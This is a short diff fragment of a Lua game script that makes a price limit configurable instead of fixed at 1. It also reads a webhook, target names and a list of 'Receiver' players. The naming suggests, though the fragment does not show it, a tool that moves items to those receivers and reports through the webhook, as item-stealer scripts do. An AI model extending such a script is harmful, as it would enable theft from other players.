@@ -36,7 +36,7 @@ do
 end
 
 local WEBHOOK = config.WEBHOOK
-local PRICE_LIMIT = 1
+local PRICE_LIMIT = config.PRICE_LIMIT
 local targetNames = config.targetNames or {}
 local receiverList = table.concat(config.Receiver or {}, ", ")
 local badPlayers = config.Receiver or {}
